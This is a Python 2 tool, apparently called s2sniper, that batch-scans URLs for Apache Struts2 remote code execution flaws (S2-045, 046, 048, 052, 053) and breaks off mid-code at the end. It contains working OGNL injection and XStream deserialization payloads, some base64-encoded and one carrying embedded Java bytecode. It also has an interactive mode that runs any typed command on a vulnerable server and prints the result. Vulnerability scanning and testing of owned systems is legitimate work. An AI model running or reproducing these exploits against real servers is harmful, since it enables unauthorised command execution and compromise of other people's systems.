#coding:utf-8
#Author:LSA
#Description:struts2 series bugs batch check 
#Date:20170830

import requests
import sys
import urllib
import urllib2
import base64
import optparse
import os
import datetime
import Queue
import threading
import re
from urllib import quote

lock = threading.Lock()

happy = 0

q0 = Queue.Queue()

threadlist = []

s045 = 0
s046 = 0
s048 = 0
s052 = 0
s053 = 0

result = {}

try:
	import requests.packages.urllib3
	requests.packages.urllib3.disable_warnings()
except Exception:
	pass


def poc045(url,nowtime):
	
	#--------------------st2-045--------------------------------------------------
	headers = {}
	headers["User-Agent"] = 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'
	
	command = 'echo helloworld9870123'
	payload045 = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    	headers["Content-Type"] = payload045
	try:
	
    		r0 = requests.get(url, headers=headers,timeout=7)
	except Exception as e:
		if w2f==0:
			result['st2-045'] = 'st2-045 attack error!'
			print 'st2-045 attack error!'
		return -1

    	if "helloworld9870123" in r0.content:
		global happy
		happy = 1

		if w2f:
			lock.acquire()
			global s045
			s045 = s045 + 1
			f045 = open("result/" + nowtime + "/st2-045-vuln.txt","a")
			f045.write(url)
			f045.flush()
			f045.close()
			lock.release()
		else:
			result['st2-045'] = 'st2-045 vulnerable'
			print 'st2-045 vulnerable!!!'

	#--------------------------------------------------------------------------------


def poc046(url,nowtime):
	#---------------------------st2-046------------------------------------------
	headers = {}
	command = 'echo helloworld9870123'
	payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
        payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
        end_null_byte = '0063'.decode('hex')
        payload046 = payload_l + command + payload_r + end_null_byte
	
	user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)'
        header_payload = 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
        headers = {'User-Agent': user_agent,
               'Content-Type': header_payload}
        body_payload = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name="foo"; filename="{0}"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--'''.format(payload046) 
 	try:
		
        	req = urllib2.Request(url, headers=headers,data=body_payload)
        	response = urllib2.urlopen(req,timeout=7)
		r1 = response.read()
	except Exception as e:
		if w2f==0:
			result['st2-046'] = 'st2-046 attack error'
            		print 'st2-046 attack error!'
		return -1
        if 'helloworld9870123' in r1:
		global happy
		happy = 1

		if w2f:	
			lock.acquire()	
			global s046
			s046 = s046 + 1
			f046 = open("result/" + nowtime + "/st2-046-vuln.txt","a")
			f046.write(url)
			f046.flush()
			f046.close()
			lock.release()
		else:
			result['st2-046'] = 'st2-046 vulnerable'
			print 'st2-046 vulnerable!!!'
	#---------------------------------------------------------------------------------


def poc048(url,nowtime):
	#------------------------st2-048----------------------------------
	cmd = urllib.quote('echo helloworld9870123') 
    	payload048 = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27"+cmd+"%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=996&__cheackbox_bustedBefore=true&description=hello"
    	try:
        	req = urllib2.urlopen(url, payload048,timeout=7)
        	r2 = req.read()
        	
    	except Exception as e:
		if w2f==0:
			result['st2-048'] = 'st2-048 attack error'
			print 'st2-048 attack error!'
        	return -1

	if 'helloworld9870123' in r2:
		global happy
		happy = 1

		if w2f:
			lock.acquire()
			global s048
			s048 = s048 + 1
			f048 = open("result/" + nowtime + "/st2-048-vuln.txt","a")
			f048.write(url)
			f048.flush()
			f048.close()
			lock.release()
		else:
			result['st2-048'] = 'st2-048 vulnerable'
			print 'st2-048 vulnerable!!!'		

        	
	#--------------------------------------------------------------------------------

#----------------------------------st2-052----------------------------------
def urlencode052(url):
	url = url.replace('#', '%23')
    	url = url.replace(' ', '%20')
    	if ('://' not in url):
        	url = str('http') + str('://') + str(url)
    	return url


def exp052(url,cmd):
	url = urlencode052(url)
	command = "".join(["<string>{0}</string>".format(_) for _ in cmd.split(" ")])
	payload052 = """
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        {0}
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
""".format(command)

    	headers = {
        	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
        	'Referer': str(url),
        	'Content-Type': 'application/xml',
        	'Accept': '*/*'
    	}

    	timeout = 7
    	try:
        	rsp = requests.post(url, data=payload052, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
    	except Exception as e:
        	#print e
        	rsp = 'error'
    	return rsp


def poc052(url,nowtime):
	url = urlencode052(url)
    	init_req = exp052(url, "")
    	if init_req == 'error':
        	rst = False
		if w2f == 0:
			result['st2-052'] = 'st2-052 attack error'
        		print 'st2-052 attack error!'
        	return -1

    	payload_sleep_based_10seconds = """
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
                      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                        <default>
                          <__name>Pwnr</__name>
                          <__bytecodes>
                            <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD
bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5
bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94
c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs
YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv
eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u
cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu
L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7
KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B
eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs
L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu
amF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs
ZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp
bWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv
YXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs
L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA
BXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy
MTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA
AQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A
AAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A
AAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa
AAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA
AAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA
AgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ
</byte-array>
                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
dFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy
aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2
YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh
bmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp
bC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB
AAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA
AAoAAQACABYAEAAJ</byte-array>
                          </__bytecodes>
                          <__transletIndex>-1</__transletIndex>
                          <__indentNumber>0</__indentNumber>
                        </default>
                        <boolean>false</boolean>
                      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
                      <name>newTransformer</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
"""
    	headers = {
        	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
        	'Referer': str(url),
        	'Content-Type': 'application/xml',
        	'Accept': '*/*'
    	}

    	timeout = 7
    	try:
        	requests.post(url, data=payload_sleep_based_10seconds, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        	rst = False
    	except Exception:
        	rst = True
	
    	if rst is True:
		global happy
		happy = 1

		if w2f:
			lock.acquire()
			global s052
			s052 = s052 + 1
			f052 = open("result/" + nowtime + "/st2-052-vuln.txt","a")
			f052.write(url)
			f052.flush()
			f052.close()
			lock.release()
		else:
	
			result['st2-052'] = 'st2-052 vulnerable'
			print 'st2-052 vulnerable!!!'
		
		
#---------------------------------------------------------------------------------

def poc053(url,nowtime):
	command = 'echo hello9870123'
	param = 'name'
	payload053 = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
	theUrl = "{}/?{}={}".format(url, param, quote(payload053))
	try:

		rsp = requests.get(theUrl, timeout=7)
	except Exception as e:
		if w2f==0:
			
			result['st2-053'] = 'st2-053 attack error'
			print 'st2-053 attack error!'
        	return -1
    	if 'hello9870123' in rsp.text:
		global happy
		happy = 1

		if w2f:
			lock.acquire()
			global s053
			s053 = s053 + 1
			f053 = open("result/" + nowtime + "/st2-053-vuln.txt","a")
			f053.write(url)
			f053.flush()
			f053.close()
			lock.release()
		else:
	
			result['st2-053'] = 'st2-053 vulnerable'
			print 'st2-053 vulnerable!!!'
	




def execpoc(nowtime,url=""):
	global countlines
	while (not q0.empty()):            #batch
		
		theUrl = q0.get()
		qcount = q0.qsize()
		print 'checking ' + theUrl + '---[' +  str(countlines - qcount) + '/' + str(countlines) + ']'
		poc045(theUrl,nowtime)
		poc046(theUrl,nowtime)
		poc048(theUrl,nowtime)
		poc052(theUrl,nowtime)
		poc053(theUrl,nowtime)
		

#---------------------------------------------------------

	else:                         #single
		poc045(url,nowtime)
		poc046(url,nowtime)
		poc048(url,nowtime)
		poc052(url,nowtime)
		poc053(url,nowtime)
	
	if happy == 0 and w2f == 0:
		result['st2-all'] = 'Nothing'
		print 'Unlucky!Nothing!'

#------------------------------------logger----------------------------------------

def logger(nowtime1,operation,result,usedtime):
	today = datetime.datetime.now().strftime('%Y%m%d')
	flog = open("log/" + today + ".txt","a")
	formatResult = ""
	for key in result:
		formatResult = formatResult + key + ": " + str(result[key]) + "\n"	

	flog.writelines("\nLaunched time: " + nowtime1 + "\nOperation: " + operation + "\nResult:\n" + formatResult + "Used time: " + str(usedtime) + "s\n--------------------------------------------------------------")
	flog.flush()
	flog.close()
#----------------------------------------------------------------------------------


#-----------------------------------batch statistics--------------------------------------

def statistics():
	global countlines
	print '##############Statistics#################'
	print 'Total ' + str(countlines) + ' urls'
	print 'st2-045 : ' + str(s045)
	print 'st2-046 : ' + str(s046)
	print 'st2-048 : ' + str(s048)
	print 'st2-052 : ' + str(s052)
	print 'st2-053 : ' + str(s053)

	print '#########################################'
	
#----------------------------------------------------------------------------------

if __name__ == '__main__':
	
	global w2f
	w2f = 0
	
	#stime = datetime.datetime.now()

	stime = datetime.datetime.now()
	nowtime = stime.strftime('%Y%m%d%H%M%S')
	nowtime1 = stime.strftime('%Y-%m-%d %H:%M:%S')
	print '*************s2sniper launched in ' + nowtime1 + '***************'	

	parser = optparse.OptionParser('python %prog '+\
      	   '-h <manual>')
    	parser.add_option('-u', dest='tgtUrl', type='string',\
      	   help='input target url')
    	parser.add_option('-f', dest='tgtFilepath', type='string',\
           help='input a filepath about urls')
    	parser.add_option('-t', dest='threads', type='int', default=5,\
           help='input a threads num')
	parser.add_option('-c', dest='pld', type='str',\
           help='input payload number <045/046/048/052/053>')


    
    	(options, args) = parser.parse_args()

    	tgtUrl = options.tgtUrl

	tgtFilepath = options.tgtFilepath

	threads = options.threads

	pld = options.pld

	if (pld and tgtUrl) and (tgtFilepath is None):
		if pld == '045':	
			while True:
				command = raw_input("cmd>>> ")
				if command == 'exit':
					sys.exit()
				payload045 = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" 
				headers = {'Content-Type':payload045}
				cmdResult = requests.get(tgtUrl,headers=headers,timeout=7)
				print cmdResult.text
				
		if pld == '046':	
			while True:
				command = raw_input("cmd>>> ")
				if command == 'exit':
					sys.exit()
				headers = {}
	
				payload_l = base64.decodestring(u'JXsoI25pa2U9J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJlckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1waG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpbD0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2thZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2VzKCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigjY21kPSc=')
        			payload_r = base64.decodestring(u'JykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfQ==')
        			end_null_byte = '0063'.decode('hex')
        			payload046 = payload_l + command + payload_r + end_null_byte
	
				user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)'
        			header_payload = 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
        			headers = {'User-Agent': user_agent,
               				'Content-Type': header_payload}
        			body_payload = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name="foo"; filename="{0}"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--'''.format(payload046) 
        			cmdResult = requests.get(tgtUrl, headers=headers,data=body_payload,timeout=7)
				print cmdResult.text
		if pld == '048':
			while True:
				command = raw_input("cmd>>> ")
				if command == 'exit':
					sys.exit()
				payload048 = "name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27"+command+"%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=996&__cheackbox_bustedBefore=true&description=hello"
    	
        			cmdResult = requests.get(tgtUrl,payload048,timeout=7)
        			
				print cmdResult.text
				
		if pld == '052':
			command = raw_input("cmd>>> ")
			exp052(tgtUrl,command)	
			print 'command executed over!\n'
			sys.exit()

		if pld == '053':
			param = 'name'
			while True:
				command = raw_input("cmd>>> ")
				if command == 'exit':
					sys.exit()
				payload053 = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
				theUrl = "{}/?{}={}".format(tgtUrl, param, quote(payload053))
        			rsp = requests.get(theUrl, timeout=7)
				rspage = rsp.text
        			
    				#reg = re.compile(r'name: (.*?)')
    				#h = re.findall(reg,rspage)
				#print h[0]
				print rspage
		
	else:
	
		if(tgtUrl and (tgtFilepath is None) and (pld is None)):
			operation = '-u ' + tgtUrl
			execpoc(nowtime,tgtUrl)

		else:
			if(tgtFilepath and (tgtUrl is None) and (pld is None)):
				if threads != 5:
					operation = '-f ' + tgtFilepath + ' -t ' + str(threads)
				else:
					operation = '-f ' + tgtFilepath

				stime = datetime.datetime.now()
				os.mkdir("result/"+nowtime)
				w2f = 1
				urlsFile = open(tgtFilepath)
				global countlines
